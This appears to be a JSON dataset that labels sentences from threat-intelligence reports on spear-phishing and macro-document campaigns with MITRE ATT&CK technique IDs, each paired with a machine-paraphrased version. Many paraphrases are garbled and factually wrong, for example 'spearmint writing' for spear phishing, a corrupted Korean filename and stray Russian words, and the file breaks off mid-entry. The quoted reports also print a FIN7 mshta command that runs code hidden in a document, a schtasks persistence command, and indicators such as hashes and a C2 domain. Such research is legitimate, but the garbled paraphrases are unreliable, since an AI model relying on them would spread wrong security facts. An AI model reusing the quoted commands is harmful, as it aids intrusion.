    "Looking at earlier attacks between 2013 and 2016, we believe Comnie was also used in targeted attacks against the following individuals or organizations:  Taiwan government IT service vendor in Asia Journalist of a Tibetan radio station   Figure 6 Email sent to Journalist of Tibetan radio station   Malicious Macros The malicious macro documents used to deliver Comnie initially hide the content inside and requests that the user enables macros prior to viewing the document": [
        {
            "tec_id": "T1566.001",
            "en_text": "Looking at earlier attacks between 2013 and 2016, we believe Comnie was also used in targeted attacks against the following individuals or organizations:  Taiwan government IT service vendor in Asia Journalist of a Tibetan radio station   Figure 6 Email sent to Journalist of Tibetan radio station   Malicious Macros The malicious macro documents used to deliver Comnie initially hide the content inside and requests that the user enables macros prior to viewing the document",
            "data_text": "Looking at previous attacks between 2013 and 2016, we believe Comney was also used in targeted attacks on the following individuals or organizations: Taiwanese government IT service provider in Asia Journalist of Tibetan radio station Figure 6 E-mail sent to journalist of Tibetan radio station Evil Macros"
        }
    ],
    "APT32 actors continue to deliver the malicious attachments via spear-phishing emails": [
        {
            "tec_id": "T1566.001",
            "en_text": "APT32 actors continue to deliver the malicious attachments via spear-phishing emails",
            "data_text": "APT32 actors continue to deliver malicious attachments through write-facing emails"
        }
    ],
    "The credential harvesting attacks used spear-phishing emails that contained malicious Microsoft Office documents that leveraged the “attachedTemplate” technique to load a template from a remote server": [
        {
            "tec_id": "T1566.001",
            "en_text": "The credential harvesting attacks used spear-phishing emails that contained malicious Microsoft Office documents that leveraged the “attachedTemplate” technique to load a template from a remote server",
            "data_text": "Attacks to obtain credentials used phishing messages containing malicious Microsoft Office documents that used the \"attached template\" method to download the template from a remote server."
        }
    ],
    "The attack involved a spear-phishing email with a subject of “Project Offer” and a malicious Word document (SHA256: d393349a4ad00902e3d415b622cf27987a0170a786ca3a1f991a521bff645318) as an attachment": [
        {
            "tec_id": "T1566.001",
            "en_text": "The attack involved a spear-phishing email with a subject of “Project Offer” and a malicious Word document (SHA256: d393349a4ad00902e3d415b622cf27987a0170a786ca3a1f991a521bff645318) as an attachment",
            "data_text": "The attack involves a write-mail with the subject \"Project Proposal\" and a malicious Word document (SHA256: d393349a4ad00902e3d415b622cf27987a0170a786ca3a1f991a521bff645318) as the attachment."
        }
    ],
    "Attached to this email was a malicious Microsoft Word document (MD5: f6fafb7c30b1114befc93f39d0698560) that exploited CVE-2012-0158": [
        {
            "tec_id": "T1566.001",
            "en_text": "Attached to this email was a malicious Microsoft Word document (MD5: f6fafb7c30b1114befc93f39d0698560) that exploited CVE-2012-0158",
            "data_text": "Attached is a Microsoft Word malicious document (MD5: f6fafb7c30b1114befc93f39d0698560) that operated CVE-2012-0158"
        }
    ],
    "Like past attacks, the initial infection vector is a malicious Word document attached to a phishing email that is well-tailored to the targeted business and its day-to-day operations": [
        {
            "tec_id": "T1566.001",
            "en_text": "Like past attacks, the initial infection vector is a malicious Word document attached to a phishing email that is well-tailored to the targeted business and its day-to-day operations",
            "data_text": "As in previous attacks, the initial infection vector is a malicious Word document attached to phishing email that is well adapted to the target business and its daily activities."
        }
    ],
    "Phishing emails with political themes were used in the majority of the observed attack emails": [
        {
            "tec_id": "T1566.001",
            "en_text": "Phishing emails with political themes were used in the majority of the observed attack emails",
            "data_text": "Most of the reported attacks used phishing messages with political themes."
        }
    ],
    "In order to meet the phishing emails’ infrastructure requirements, disposable domains and emails were used as the delivery medium": [
        {
            "tec_id": "T1566.001",
            "en_text": "In order to meet the phishing emails’ infrastructure requirements, disposable domains and emails were used as the delivery medium",
            "data_text": "To meet phishing mail infrastructure needs, disposable domains and e-mails were used as delivery media"
        }
    ],
    "Based on our analysis, financial organizations in Turkey were targeted via spear phishing emails containing a malicious Microsoft Word document": [
        {
            "tec_id": "T1566.001",
            "en_text": "Based on our analysis, financial organizations in Turkey were targeted via spear phishing emails containing a malicious Microsoft Word document",
            "data_text": "Based on our analysis, financial institutions in Turkey have been directed to receive emails containing Microsoft Word malware."
        }
    ],
    "Figure 2: Excerpt of an APT33 malicious .hta file We assess APT33 used a built-in phishing module within the publicly available ALFA TEaM Shell (aka ALFASHELL) to send hundreds of spear phishing emails to targeted individuals in 2016": [
        {
            "tec_id": "T1566.001",
            "en_text": "Figure 2: Excerpt of an APT33 malicious .hta file We assess APT33 used a built-in phishing module within the publicly available ALFA TEaM Shell (aka ALFASHELL) to send hundreds of spear phishing emails to targeted individuals in 2016",
            "data_text": "Figure 2: APT33 Malicious File Output.hta We estimate that APT33 used the built-in phishing module in the publicly available ALFA TEaM Shell (aka ALFASHELL) to send hundreds of spear-writing letters to targets in 2016."
        }
    ],
    "The spear phishing emails and attached malicious macro documents typically have geopolitical themes": [
        {
            "tec_id": "T1566.001",
            "en_text": "The spear phishing emails and attached malicious macro documents typically have geopolitical themes",
            "data_text": "Spear-writing and attached macro-documents usually have geopolitical themes."
        }
    ],
    "The attackers used spear phishing emails combined with malicious HWP documents created using Hancom Hangul Office Suite": [
        {
            "tec_id": "T1566.001",
            "en_text": "The attackers used spear phishing emails combined with malicious HWP documents created using Hancom Hangul Office Suite",
            "data_text": "The attackers used spearmint writing in conjunction with malicious HWP documents created using Hancom Hangul Office Suite"
        }
    ],
    "We suspect the attacker was trying to generate sympathy by reminding the reader that Munchon and the province it is in, Kangwon, were part of a unified province that included South Korea's Gangwon-do prior to the division of Korea in 1945.A second email contained a story about a person called 'Ewing Kim' who was looking for help:The email's attachments are two different HWP documents, both leveraging same vulnerability (CVE-2013-0808)": [
        {
            "tec_id": "T1566.001",
            "en_text": "We suspect the attacker was trying to generate sympathy by reminding the reader that Munchon and the province it is in, Kangwon, were part of a unified province that included South Korea's Gangwon-do prior to the division of Korea in 1945.A second email contained a story about a person called 'Ewing Kim' who was looking for help:The email's attachments are two different HWP documents, both leveraging same vulnerability (CVE-2013-0808)",
            "data_text": "We suspect that the attacker tried to create sympathy by reminding the reader that Muncheon and the province where Gangwon is located were part of the unified province that South Korea's Gangwon-do entered before the division of Korea in 1945.The second post contained a story about a man named \"Ewing Kim\" who was looking for help: Email attachments represent two different HWP documents, both of which use the same vulnerability (CVE-2013-0808)"
        }
    ],
    "This campaign began with a handful of spear phishing emails to South Korean targets and containing malicious attachments": [
        {
            "tec_id": "T1566.001",
            "en_text": "This campaign began with a handful of spear phishing emails to South Korean targets and containing malicious attachments",
            "data_text": "This campaign started with several letters, writing spears at South Korean targets and containing malicious bindings"
        }
    ],
    "MAGIC HOUND TOOLSET The Magic Hound attacks did not rely on exploit code to compromise targeted systems, instead relying on executables and Microsoft Office documents, specifically Excel and Word documents containing malicious macros": [
        {
            "tec_id": "T1566.001",
            "en_text": "MAGIC HOUND TOOLSET The Magic Hound attacks did not rely on exploit code to compromise targeted systems, instead relying on executables and Microsoft Office documents, specifically Excel and Word documents containing malicious macros",
            "data_text": "Magic Hound attacks did not rely on code to compromise target systems, but on executable Microsoft Office files and documents, in particular Excel and Word containing malicious macros."
        }
    ],
    "The emails had a malicious Excel macro document attached, which when executed led to a new Microsoft Visual Basic (VB) script-based malware family which we are dubbing “BabyShark”": [
        {
            "tec_id": "T1566.001",
            "en_text": "The emails had a malicious Excel macro document attached, which when executed led to a new Microsoft Visual Basic (VB) script-based malware family which we are dubbing “BabyShark”",
            "data_text": "An Excel malicious macro was attached to the e-mail, which when executed created a new family of software based on Microsoft Visual Basic (VB) scripts, which we call \"BabyShark\""
        }
    ],
    "Another interesting characteristic of the malicious documents is that the metadata associated with the document files themselves also matches that found in many of the malicious documents that were previously being used to spread Remcos.Figure 3: Document metadataAdditionally, the creation and modification dates associated with these documents are shortly after we released a detailed analysis of Remcos distribution campaigns that were being observed throughout 2018": [
        {
            "tec_id": "T1566.001",
            "en_text": "Another interesting characteristic of the malicious documents is that the metadata associated with the document files themselves also matches that found in many of the malicious documents that were previously being used to spread Remcos.Figure 3: Document metadataAdditionally, the creation and modification dates associated with these documents are shortly after we released a detailed analysis of Remcos distribution campaigns that were being observed throughout 2018",
            "data_text": "Another interesting feature of malicious documents is that the metadata associated with document files also matches the data found in many malicious documents that were previously used to distribute Remcos.Figure 3: Metadata documentsTo do this, the creation dates and changes associated with these documents are shortly after we released a detailed analysis of the Remcos distribution campaign that was observed during 2018."
        }
    ],
    "In May 2016, we published a blog detailing a spear phishing campaign targeting banks in the Middle East region that used macro-enabled attachments to distribute POWBAT malware": [
        {
            "tec_id": "T1566.001",
            "en_text": "In May 2016, we published a blog detailing a spear phishing campaign targeting banks in the Middle East region that used macro-enabled attachments to distribute POWBAT malware",
            "data_text": "In May 2016, we published a blog detailing the spear phishing campaign targeting Middle Eastern banks that used macro-connected apps to distribute POWBAT malware."
        }
    ],
    "Analysis APT34 sent a malicious .rtf file (MD5: a0e6933f4e0497269620f44a083b2ed4) as an attachment in a malicious spear phishing email sent to the victim organization": [
        {
            "tec_id": "T1566.001",
            "en_text": "Analysis APT34 sent a malicious .rtf file (MD5: a0e6933f4e0497269620f44a083b2ed4) as an attachment in a malicious spear phishing email sent to the victim organization",
            "data_text": "APT34 Analysis sent a malicious .rtf file (MD5: a0e6933f4e0497269620f44a083b2ed4) as an attached malicious email phishing sent by an organization victim."
        }
    ],
    "This attack diverged from previous attacks we observed from this group as it involved spear-phishing emails sent to targeted organizations with password protected RAR archive attachments that contained malicious Excel Web Query files (.iqy)": [
        {
            "tec_id": "T1566.001",
            "en_text": "This attack diverged from previous attacks we observed from this group as it involved spear-phishing emails sent to targeted organizations with password protected RAR archive attachments that contained malicious Excel Web Query files (.iqy)",
            "data_text": "This attack was different from previous attacks we observed in this group because it concerned writing letters sent to target organizations with password-protected RAR archive attachments containing Excel Web Query (.iqy) malicious files."
        }
    ],
    "In this instance a spear phishing email was used containing a lure designed to socially engineer and entice the victim to executing a malicious attachment": [
        {
            "tec_id": "T1566.001",
            "en_text": "In this instance a spear phishing email was used containing a lure designed to socially engineer and entice the victim to executing a malicious attachment",
            "data_text": "In this case, a spear pen containing a lure designed for social engineering and attracting a victim to perform a malicious attachment was used."
        }
    ],
    "In contrast to the two samples used in these attacks, this one did not use a PE attachment, and instead used a Microsoft Word document containing a malicious macro as the delivery vehicle": [
        {
            "tec_id": "T1566.001",
            "en_text": "In contrast to the two samples used in these attacks, this one did not use a PE attachment, and instead used a Microsoft Word document containing a malicious macro as the delivery vehicle",
            "data_text": "Unlike the two samples used in these attacks, this one did not use a PE application, but instead used a Microsoft Word document containing a malicious macro as a delivery vehicle."
        }
    ],
    "The email contained an attachment named Seminar-Invitation.doc, which is a malicious Microsoft Word document we track as ThreeDollars": [
        {
            "tec_id": "T1566.001",
            "en_text": "The email contained an attachment named Seminar-Invitation.doc, which is a malicious Microsoft Word document we track as ThreeDollars",
            "data_text": "The email contains an application called Seminary-Invitation.doc, which is a malicious Microsoft Word document that we track as ThreeDollars"
        }
    ],
    "Zebrocy is delivered primarily via phishing attacks that contain malicious Microsoft Office documents with macros as well as simple executable file attachments": [
        {
            "tec_id": "T1566.001",
            "en_text": "Zebrocy is delivered primarily via phishing attacks that contain malicious Microsoft Office documents with macros as well as simple executable file attachments",
            "data_text": "Zebrocy comes primarily through phishing attacks that contain malicious Microsoft Office documents with macros, as well as simple executable attachments"
        }
    ],
    "Malicious Document   Decoy Document  The attack starts with a spear-phishing email containing the HWP document named \"미북 정상회담 전망 및 대비.hwp\" (Prospects for US-North Korea Summit .hwp)": [
        {
            "tec_id": "T1566.001",
            "en_text": "Malicious Document   Decoy Document  The attack starts with a spear-phishing email containing the HWP document named \"미북 정상회담 전망 및 대비.hwp\" (Prospects for US-North Korea Summit .hwp)",
            "data_text": "The attack begins with a written letter containing an HWP document called \"북북상담담전및및및및및및대대대대비비.hwp\" (The Prospects of the U.S.-North Korea Summit)."
        }
    ],
    "Initial Attack On December 13, 2017, a spear phishing email was sent from the email address of yuri.sidorav@yandex[.]ru to a high ranking individual within a British government agency": [
        {
            "tec_id": "T1566.001",
            "en_text": "Initial Attack On December 13, 2017, a spear phishing email was sent from the email address of yuri.sidorav@yandex[.]ru to a high ranking individual within a British government agency",
            "data_text": "The initial attack was on December 13, 2017, via e-mail to Yuri.sidorav@yandex[.] was sent a phishing address of a senior person to a British government agency."
        }
    ],
    "Traps blocks all of the files currently associated with Gorgon Group    Appendix   Analysis of a targeted attack “1971 Liberation War Freedom Fighters in Pakistan ArmyCustody Database98” The delivery documents used in the targeted attacks are Microsoft Office documents that contain a macro that attempts to compromise the system": [
        {
            "tec_id": "T1566.001",
            "en_text": "Traps blocks all of the files currently associated with Gorgon Group    Appendix   Analysis of a targeted attack “1971 Liberation War Freedom Fighters in Pakistan ArmyCustody Database98” The delivery documents used in the targeted attacks are Microsoft Office documents that contain a macro that attempts to compromise the system",
            "data_text": "Traps blocks all files currently associated with Gorgon Group Application Target Attack Analysis \"1971 Liberal Warriors in Pakistan Army Castody Database98\" Delivery documents used in target attacks are Microsoft Office documents containing a macro that attempts to compromise the system."
        }
    ],
    "Delivery TG-3390 conducts SWCs or sends spearphishing emails with ZIP archive attachments": [
        {
            "tec_id": "T1566.001",
            "en_text": "Delivery TG-3390 conducts SWCs or sends spearphishing emails with ZIP archive attachments",
            "data_text": "Delivery TG-3390 Leads SWC or Sends ZIP Archive Application Messages"
        }
    ],
    "The initial infection vector of this campaign is a Microsoft Office Excel Worksheet with an Office macro that uses the mshta.exe Windows executable to run scripts, which are embedded in the HTML of a specially-crafted blogspot.com page": [
        {
            "tec_id": "T1566.001",
            "en_text": "The initial infection vector of this campaign is a Microsoft Office Excel Worksheet with an Office macro that uses the mshta.exe Windows executable to run scripts, which are embedded in the HTML of a specially-crafted blogspot.com page",
            "data_text": "The initial vector of infection of this campaign is Microsoft Office Excel Worksheet with Office macro that uses the executable file mshta.exe Windows to run scripts that are embedded in HTML of a specially created page blogspot.com"
        }
    ],
    "The case we found arrived through a targeted email that contained a document file (in docx format).": [
        {
            "tec_id": "T1566.001",
            "en_text": "The case we found arrived through a targeted email that contained a document file (in docx format).",
            "data_text": "In the case that we found, it came through the address mail containing the document file (in docx format)."
        }
    ],
    "APT32 likely used COVID-19-themed malicious attachments against Chinese speaking targets.": [
        {
            "tec_id": "T1566.001",
            "en_text": "APT32 likely used COVID-19-themed malicious attachments against Chinese speaking targets.",
            "data_text": "APT32 probably used malicious attachments with the theme of COVID-19 against Chinese-speaking targets."
        }
    ],
    "Once the password (delivered in the body of the email) is entered, the users are presented with a document that will request users to enable the malicious macro, as shown in Figure 3": [
        {
            "tec_id": "T1204",
            "en_text": "Once the password (delivered in the body of the email) is entered, the users are presented with a document that will request users to enable the malicious macro, as shown in Figure 3",
            "data_text": "After entering the password (delivered to the e-mail body), users will be presented with a document that will require users to enable the malicious macro, as shown in Figure 3."
        }
    ],
    "Successful execution of the macro within the malicious document results in the installation of APT28’s signature GAMEFISH malware": [
        {
            "tec_id": "T1204",
            "en_text": "Successful execution of the macro within the malicious document results in the installation of APT28’s signature GAMEFISH malware",
            "data_text": "Successful execution of macro in malicious documentation results in installing APT28 GAMEFISH malware signature"
        }
    ],
    "Once the user enables macros, the macro will perform the following actions:  Displays decoy content Checks for the existence of a file at %APPDATA%\\wscript.exe If %APPDATA%\\wscript.exe does not exist, the macro converts an embedded hex-encoded string into bytes and saves this data to the %APPDATA%\\wscript.exe": [
        {
            "tec_id": "T1204",
            "en_text": "Once the user enables macros, the macro will perform the following actions:  Displays decoy content Checks for the existence of a file at %APPDATA%\\wscript.exe If %APPDATA%\\wscript.exe does not exist, the macro converts an embedded hex-encoded string into bytes and saves this data to the %APPDATA%\\wscript.exe",
            "data_text": "After enabling the macros, the macro performs the following steps: Displays the contents of the Deco Check for File Availability in %APPDA%\\wscript.exe If %APPDATA%\\wscript.exe does not exist, the macro converts the embedded sixteen-encoded string into bytes and stores the data in %APPDATA%\\wscript.exe."
        }
    ],
    "None of the known documents contain a lure image or message to instruct the recipient to click the Enable Content button necessary to run the macro, as seen in Figure 1": [
        {
            "tec_id": "T1204",
            "en_text": "None of the known documents contain a lure image or message to instruct the recipient to click the Enable Content button necessary to run the macro, as seen in Figure 1",
            "data_text": "None of the known documents contains a bait image or a message to click the Enable content required to launch the macro, as shown in Figure 1."
        }
    ],
    "The majority of delivery documents contain a generic lure image requesting the victim enable macros with no additional content, the adversaries seemingly relying solely on lure filenames to entice victims to launch the malicious document": [
        {
            "tec_id": "T1204",
            "en_text": "The majority of delivery documents contain a generic lure image requesting the victim enable macros with no additional content, the adversaries seemingly relying solely on lure filenames to entice victims to launch the malicious document",
            "data_text": "Most delivery documents contain a generic bait pattern requiring the victim to include macros without additional content, opponents seem to rely solely on bait names to lure victims to launch a malicious document."
        }
    ],
    "The victim will then see a prompt to Enable Content as with any malicious macro document as seen in Figure 5": [
        {
            "tec_id": "T1204",
            "en_text": "The victim will then see a prompt to Enable Content as with any malicious macro document as seen in Figure 5",
            "data_text": "Then the victim will see a request to include the content, just like any malicious macro document, as shown in Figure 5."
        }
    ],
    "Figure 5 Remote template document requesting the user to click “Enable Content” to run macro Clustering The delivery documents used in the October and November waves shared a large number of similarities, as seen in Table 1, which allowed us to cluster the activity together": [
        {
            "tec_id": "T1204",
            "en_text": "Figure 5 Remote template document requesting the user to click “Enable Content” to run macro Clustering The delivery documents used in the October and November waves shared a large number of similarities, as seen in Table 1, which allowed us to cluster the activity together",
            "data_text": "Figure 5 Remote template document that prompts user to click \"Enable Content\" to launch macro-clustering Delivery documents used in October and November waves shared a large number of similarities as seen in Table 1, which allowed us to cluster activities together"
        }
    ],
    "Figure 1: Malicious FIN7 lure asking victim to double click to unlock contents The malicious LNK launches “mshta.exe” with the following arguments passed to it: vbscript:Execute(\"On Error Resume Next:set w=GetObject(,\"\"Word.Application\"\"):execute w.ActiveDocument.Shapes(2).TextFrame.TextRange.Text:close\") The script in the argument combines all the textbox contents in the document and executes them, as seen in Figure 2": [
        {
            "tec_id": "T1204",
            "en_text": "Figure 1: Malicious FIN7 lure asking victim to double click to unlock contents The malicious LNK launches “mshta.exe” with the following arguments passed to it: vbscript:Execute(\"On Error Resume Next:set w=GetObject(,\"\"Word.Application\"\"):execute w.ActiveDocument.Shapes(2).TextFrame.TextRange.Text:close\") The script in the argument combines all the textbox contents in the document and executes them, as seen in Figure 2",
            "data_text": "Figure 1: The malicious fin7 lure, asking the victim to double-click to unlock the contents, the attacker runs \"mshta.exe\" with the following arguments passed to it: vbscript: Run (\"About the error resume Next:set w=GetObject(\",\"Word.Application\"):executing w.Active document.Forms(2).TextFrame.Text Range.Text:close\") The script in the argument merges all the contents of the text box in the document and executes them as shown in Figure 2."
        }
    ],
    "Malicious processes are marked red (click image to enlarge):  The following malicious files are dropped and run:  C:\\ProgramData\\{2ED05C38-D464-4188-BC7F-F6915DE8D764}\\OFFLINE\\9A189DFE\\C7B7C186\\main.vbs dcac79d7dc4365c6d742a49244e81fd0 C:\\Users\\Public\\Libraries\\RecordedTV\\DnE.ps1 7fe0cb5edc11861bc4313a6b04aeedb2 C:\\Users\\Public\\Libraries\\RecordedTV\\DnS.ps1 3920c11797ed7d489ca2a40201c66dd4 “C:\\Windows\\System32\\schtasks.exe” /create /F /sc minute /mo 3 /tn “GoogleUpdateTasksMachineUI” /tr C:\\Users\\Public\\Libraries\\RecordedTV\\backup.vbs 7528c387f853d96420cf7e20f2ad1d32  Command and control server is located in the following domain: tecsupport[.]in A detailed analysis of the malware is provided in two posts by Palo Alto networks and in a post by FireEye, which wrote about previous campaigns by this threat agent": [],
    "This document was a decoy aimed to entice the user to open malicious documents embedded further down the pageThe actor embedded two additional links and the document urged the user to click on these links for more information about New Year's activities in North Korea": [
        {
            "tec_id": "T1204",
            "en_text": "This document was a decoy aimed to entice the user to open malicious documents embedded further down the pageThe actor embedded two additional links and the document urged the user to click on these links for more information about New Year's activities in North Korea",
            "data_text": "This document was an underwater subtext, the purpose of which was to engage the user to discover malicious documents embedded in the further side of the pageActor built in two additional links, and the document urged the user to click on these links for more information on New Year's activities in North Korea"
        }
    ],
    "These documents contained malicious OLE objects used to drop binaries.This time, however, they contained malicious OLE (Object Link Embedded) objects.Initial analysis confirmed two similarly sized OLE object files within this document which appeared to be the same from an execution point of view.The two dropped binaries were stored and executed in this location during our analysis:C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\Hwp (2).exeC:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\Hwp (3).exeInitial analysis showed some sloppy cleaning up from Group123, which we used later to determine that separate campaigns were the work of this same actor, as compilation artifacts remained within the binaries:e:\\Happy\\Work\\Source\\version 12\\T+M\\Result\\DocPrint.pdbThe second stage of the dropped binaries was used to execute wscript.exe while injecting shellcode into this process": [
        {
            "tec_id": "T1204",
            "en_text": "These documents contained malicious OLE objects used to drop binaries.This time, however, they contained malicious OLE (Object Link Embedded) objects.Initial analysis confirmed two similarly sized OLE object files within this document which appeared to be the same from an execution point of view.The two dropped binaries were stored and executed in this location during our analysis:C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\Hwp (2).exeC:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\Hwp (3).exeInitial analysis showed some sloppy cleaning up from Group123, which we used later to determine that separate campaigns were the work of this same actor, as compilation artifacts remained within the binaries:e:\\Happy\\Work\\Source\\version 12\\T+M\\Result\\DocPrint.pdbThe second stage of the dropped binaries was used to execute wscript.exe while injecting shellcode into this process",
            "data_text": "These documents contain malware OLE objects and used to drop binaries.This time, however, they contain malware OLE (Links with the object of Embedded).Initial analysis confirmed two also the size of the OLE object files in the document, which for long periods of punishment.Two on the basis of binary packages have been saved and in this folder in the course of our analysis : C:\\Users \" ADMINI~1\\AppData\\Local \" Temp\\Hwp (2). exeC, Users\\ADMINI~1\\AppData\\Local \" Temp\\Hwp (3). exeInitial analysis showed some pretty clean from Group123, and later to determine what individual campaigns was the work of the same actor, as the compilation of artifacts in binaries:e:\\Happy\\Work\\Source\\version 12\\T+M\\Re.sult\\DocPrint.pdb.The second stage on the basis of binary packages for the implementation of the wscript.historical and injecting shellcode."
        }
    ],
    "Email attacks often use “click-worthy” or interesting topics to convince users to click links or open attachments that could lead to various threats": [
        {
            "tec_id": "T1204",
            "en_text": "Email attacks often use “click-worthy” or interesting topics to convince users to click links or open attachments that could lead to various threats",
            "data_text": "Email attacks often use \"tips\" or interesting topics to convince users to click on links or open attachments that can lead to various threats"
        }
    ],
    "Users are advised to avoid opening attachments and click links on unsolicited emails": [
        {
            "tec_id": "T1204",
            "en_text": "Users are advised to avoid opening attachments and click links on unsolicited emails",
            "data_text": "Users are advised to avoid opening attachments and to click links to unwanted emails"
        }
    ],
    "In one example, the Word document contained a button with the label “First click “Enable Content” above the page, then click here to fill out the form”  This string attempts to trick the user into enabling macros to execute the malicious code within the macro": [
        {
            "tec_id": "T1204",
            "en_text": "In one example, the Word document contained a button with the label “First click “Enable Content” above the page, then click here to fill out the form”  This string attempts to trick the user into enabling macros to execute the malicious code within the macro",
            "data_text": "In one example, a Word document contained a button with the inscription \"First click on \"Enable content\" above the page, then click here to fill in the form\" This line attempts to trick the user so that macros can execute malicious code in the macro."
        }
    ],
    "These Honeybee documents did not contain any specific lures, rather variations of a “not compatible” message attempting to convince the user to enable content": [
        {
            "tec_id": "T1204",
            "en_text": "These Honeybee documents did not contain any specific lures, rather variations of a “not compatible” message attempting to convince the user to enable content",
            "data_text": "These Honeybee documents did not contain any specific claims, but variations of the \"incompatible\" message trying to convince the user to include content."
        }
    ],
    "Additionally, a small number of campaigns over this same period also made use of various file-sharing platforms like Dropbox for hosting the malicious documents rather than directly attaching them to the messages themselves.Figure 2: Example malicious Excel documentSimilar to the technique described in our previous blog about Remcos, the contents of the documents have been intentionally made to appear as if they are blurry, with the user being prompted to enable editing to have a clearer view of the contents": [
        {
            "tec_id": "T1204",
            "en_text": "Additionally, a small number of campaigns over this same period also made use of various file-sharing platforms like Dropbox for hosting the malicious documents rather than directly attaching them to the messages themselves.Figure 2: Example malicious Excel documentSimilar to the technique described in our previous blog about Remcos, the contents of the documents have been intentionally made to appear as if they are blurry, with the user being prompted to enable editing to have a clearer view of the contents",
            "data_text": "In addition, a small number of campaigns over the same period also used various file sharing platforms, such as Dropbox, to host malicious documents, rather than directly connecting them to messages themselves.Figure 2: An example of a malicious Excel document similar to what was described in our previous Remcos blog, the contents of the documents were intentionally made to look like they were blurry, with the user offered to enable editing to have a clearer view of the content."
        }
    ],
    "By default, Excel does not allow the download of data from the remote server, but will ask for the user’s consent by presenting the dialog box in Figure 2:  Figure 2 Excel security notice for .iqy files By enabling this data connection, the user allows Excel to obtain content from the URL in the .iqy file": [
        {
            "tec_id": "T1204",
            "en_text": "By default, Excel does not allow the download of data from the remote server, but will ask for the user’s consent by presenting the dialog box in Figure 2:  Figure 2 Excel security notice for .iqy files By enabling this data connection, the user allows Excel to obtain content from the URL in the .iqy file",
            "data_text": "By default, Excel does not allow you to download data from a remote server, but will ask for the user's consent by presenting a dialog box in Figure 2: Figure 2 Excel File Security Notification."
        }
    ],
    "The document also contained a lure image, similar to ones commonly found in malicious macro documents which ask the user to click on “Enable Content” as seen in Figure 2": [
        {
            "tec_id": "T1204",
            "en_text": "The document also contained a lure image, similar to ones commonly found in malicious macro documents which ask the user to click on “Enable Content” as seen in Figure 2",
            "data_text": "The document also contained a sample bait similar to what is typically found in malicious macros that prompt the user to click on \"Enable Content\" as shown in Figure 2."
        }
    ],
    "Malicious Macro Analysis When the victim opens the ThreeDollars document they are presented with the lure image and prompted to click on the “Enable Content” button": [
        {
            "tec_id": "T1204",
            "en_text": "Malicious Macro Analysis When the victim opens the ThreeDollars document they are presented with the lure image and prompted to click on the “Enable Content” button",
            "data_text": "Macro-analysis of harmful nature When you open a ThreeDollars document, they are presented with a lure and prompted to click on the \"Include content\" button"
        }
    ],
    "Message 3:    Headers Received: by mailcenter.support   Sender Mercator Institute for China Studies <publications@mericcs.org>   Subject Authoritarian advance Responding to Chinas growing political influence in Europe   Body Content and images included within the e-mail body were a direct copy of the following MERICS report:  https://www.merics.org/sites/default/files/2018-02/GPPi_MERICS_Authoritarian_Advance_2018_1.pdf   Notes The hyperlinked text Click here to download the report within the e-mail body lead to a malicious RTF document located at the URL hxxp://www.mericcs.org/GPPi_MERICS_Authoritarian_Advance_2018_1Q.doc": [
        {
            "tec_id": "T1204",
            "en_text": "Message 3:    Headers Received: by mailcenter.support   Sender Mercator Institute for China Studies <publications@mericcs.org>   Subject Authoritarian advance Responding to Chinas growing political influence in Europe   Body Content and images included within the e-mail body were a direct copy of the following MERICS report:  https://www.merics.org/sites/default/files/2018-02/GPPi_MERICS_Authoritarian_Advance_2018_1.pdf   Notes The hyperlinked text Click here to download the report within the e-mail body lead to a malicious RTF document located at the URL hxxp://www.mericcs.org/GPPi_MERICS_Authoritarian_Advance_2018_1Q.doc",
            "data_text": "Message 3: Headers received: by mail center.Support for Sender specific Institute for China Studies <publications@mericcs.org> the unsub Авторитарного progress to answer growing political influence in Europe as part of the body and included in an electronic organ have been a straight copy of the next MERICS report : https://www.merics.org/sites/default/files/2018-02/GPPi_MERICS_Authoritarian_Advance_2018_1.pdf the relevant text with гиперссы.Click here to download the report to your e-mail body, and you will receive a malicious RTF document located at the URL hxxp:/www.mericcs.org/GPPi_MERICS_Authoritarian_Advance_2018_1Q.doc"
        }
    ],
    "Cluster A Case 1: Delivery via document property macro – a789a282e0d65a050cccae66c56632245af1c8a589ace2ca5ca79572289fd483  In our research we found at least one attack against a company leveraging a Microsoft Office Excel document with an embedded macro to launch the malware": [
        {
            "tec_id": "T1204",
            "en_text": "Cluster A Case 1: Delivery via document property macro – a789a282e0d65a050cccae66c56632245af1c8a589ace2ca5ca79572289fd483  In our research we found at least one attack against a company leveraging a Microsoft Office Excel document with an embedded macro to launch the malware",
            "data_text": "Cluster A Case 1: Delivery via Document Properties Macro – a789a282e0d65a050ccae66c56632245af1c8a589ace2ca5ca79572289fd483 In our study, we found at least one hit against a company using Microsoft Office Excel document with an embedded macro to launch malware"
        }
    ],
    "By doing so, the main content of the macro itself (Figure 2) can be kept relatively simple, and the malicious’ codes small footprint can help enable evasion of automated detection mechanisms based on macro content": [
        {
            "tec_id": "T1204",
            "en_text": "By doing so, the main content of the macro itself (Figure 2) can be kept relatively simple, and the malicious’ codes small footprint can help enable evasion of automated detection mechanisms based on macro content",
            "data_text": "Thus, the core content of the macro itself (Figure 2) can be relatively simple, and malicious small trace codes can help avoid automated macro-content-based detection mechanisms."
        }
    ],
    "In March, we came across an email with a malware attachment that used the Gamaredon group’s tactics.": [
        {
            "tec_id": "T1204",
            "en_text": "In March, we came across an email with a malware attachment that used the Gamaredon group’s tactics.",
            "data_text": "In March, we met a letter with a malware application that used Gameredon tactics."
        }
    ],
    "Whitefly first infects its victims using a dropper in the form of a malicious .exe or .dll file that is disguised as a document or image.": [
        {
            "tec_id": "T1204",
            "en_text": "Whitefly first infects its victims using a dropper in the form of a malicious .exe or .dll file that is disguised as a document or image.",
            "data_text": "Whitefly first infects its victims by using a drop as a malicious .exe or .dll file, which is hidden as a document or image."
        }
    ],
    "Once a user has double-clicked the embedded image, the form executes a VB setup script": [
        {
            "tec_id": "T1204",
            "en_text": "Once a user has double-clicked the embedded image, the form executes a VB setup script",
            "data_text": "After the user double-clicks on the embedded image, the form executes the VB configuration script."
        }
    ],
    "The threat actors also took additional steps to replace some variable strings in the more recent samples, likely in an attempt to avoid signature-based detection from Yara rules. Once the document was opened, it prompted the user to enable the macro titled \"BlackWater.bas\".": [
        {
            "tec_id": "T1204",
            "en_text": "The threat actors also took additional steps to replace some variable strings in the more recent samples, likely in an attempt to avoid signature-based detection from Yara rules. Once the document was opened, it prompted the user to enable the macro titled \"BlackWater.bas\".",
